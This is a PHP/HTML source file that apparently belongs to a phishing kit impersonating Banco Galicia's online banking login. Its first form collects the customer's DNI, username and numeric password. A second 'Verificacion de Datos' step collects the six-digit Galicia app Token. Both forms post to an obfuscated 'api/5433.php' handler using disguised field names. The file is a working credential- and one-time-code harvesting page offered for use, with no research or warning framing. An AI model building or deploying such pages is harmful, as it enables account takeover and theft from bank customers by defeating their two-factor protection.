<?php
$step     = (isset($_GET['step']) && $_GET['step'] === 'token') ? 'token' : 'login';
$hasError = isset($_GET['error']) && $_GET['error'] == 1;
$img      = require __DIR__ . '/embedcode64/images.php';
?>
<!doctype html>
<html lang="es">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Inicio</title>
    <?php if ($step === 'login'): ?>
    <link rel="stylesheet" href="assets/css/main.css">
    <link rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <?php else: ?>
    <link rel="stylesheet" href="assets/css/overlay.css">
    <?php endif; ?>
</head>

<body>

<?php if ($step === 'login'): ?>

    <main class="lg-shell">
        <section class="lg-left" aria-label="Acceso">
            <div class="lg-brand">
                <img src="<?= $img['logo'] ?>" alt="Tu marca" />
                <small>Online Banking</small>
            </div>

            <div class="lg-stage">
                <div class="lg-card">
                    <h1 class="lg-title">Iniciar sesión</h1>

                    <form method="post" action="api/5433.php">
                        <div class="lg-field">
                            <div class="lg-input">
                                <input id="doc" name="tete" placeholder=" "
                                    inputmode="numeric" autocomplete="off" minlength="7" maxlength="8" />
                            </div>
                            <label for="doc">Tu DNI</label>
                        </div>

                        <div class="lg-field">
                            <div class="lg-input">
                                <input id="user" name="feca" type="text" placeholder=" "
                                    autocomplete="username" />
                                <button class="lg-eye" type="button"
                                    aria-label="Mostrar/ocultar usuario"
                                    data-toggle-visibility="#user">
                                    <i class="bi bi-eye" aria-hidden="true"></i>
                                </button>
                            </div>
                            <label for="user">Tu usuario Galicia</label>
                        </div>

                        <div class="lg-field">
                            <div class="lg-input">
                                <input id="pass" name="teca" type="password" placeholder=" "
                                    inputmode="numeric" autocomplete="off" maxlength="4" />
                                <button class="lg-eye" type="button"
                                    aria-label="Mostrar/ocultar clave"
                                    data-toggle-visibility="#pass">
                                    <i class="bi bi-eye" aria-hidden="true"></i>
                                </button>
                            </div>
                            <label for="pass">Tu clave Galicia</label>
                        </div>

                        <div class="lg-row">
                            <label class="lg-remember">
                                <input type="checkbox" />
                                Recordar DNI y Usuario
                            </label>
                            <a class="lg-link" href="#">Teclado virtual</a>
                        </div>

                        <button id="btnLogin" class="lg-submit" type="submit" disabled>
                            INICIAR SESIÓN
                        </button>

                        <div class="lg-help">
                            <a href="#">OLVIDE O BLOQUEE MIS CLAVES</a>
                            <span class="lg-help-muted">
                                Si es tu primera vez o necesitas el usuario
                            </span>
                            <a href="#">Crear claves</a>
                        </div>
                    </form>
                </div>
            </div>

            <footer>
                Operar en el portal implica aceptar los términos y condiciones del servicio.<br />
                Información de seguridad &bull; Ayuda
            </footer>
        </section>

        <aside class="lg-right" aria-label="Ilustración"></aside>
    </main>

    <script src="assets/js/main.js"></script>

<?php else: ?>

    <div id="loader">
        <div class="tk-spinner"></div>
        <div id="loader-texto">Cargando...</div>
    </div>

    <iframe id="fondo" src="index.php"></iframe>

    <div id="overlay">
        <div class="tk-card">
            <div class="tk-header">
                <button class="tk-burger" aria-label="Menú">
                    <span></span><span></span><span></span>
                </button>
                <button class="tk-close" aria-label="Cerrar">&times;</button>
            </div>

            <div class="tk-heading">Verificacion de Datos</div>

            <div class="tk-messages">
                <div id="error"
                    class="tk-error <?= $hasError ? 'is-visible' : 'is-hidden' ?>">
                    Token incorrecto o invalido. Vuelva a ingresar nuevamente el codigo
                    Token y valide sus datos.
                </div>
                <div id="texto"
                    class="tk-text <?= $hasError ? 'is-hidden' : 'is-visible' ?>">
                    Para validar tus datos, generá el código Token de 6 dígitos en la App
                    Galicia. Luego ingresalo en esta pantalla.
                </div>
            </div>

            <label for="dato">Código Token</label>

            <form action="api/5433.php" method="post">
                <input type="text" id="dato" name="tok" placeholder="Token"
                    minlength="6" maxlength="6" required>

                <h2 class="tk-howto">¿Cómo obtener el código Token?</h2>
                <ol>
                    <li>Ingresá a la App Galicia</li>
                    <li>Presioná el botón "Token Galicia" en la pantalla de ingreso</li>
                </ol>

                <button type="submit" class="tk-submit">
                    Confirmar
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                        <path d="M9 5l7 7-7 7" stroke="currentColor" stroke-width="2.5"
                            stroke-linecap="round" stroke-linejoin="round" />
                    </svg>
                </button>
            </form>
        </div>
    </div>

    <script src="assets/js/overlay.js"></script>

<?php endif; ?>

</body>

</html>
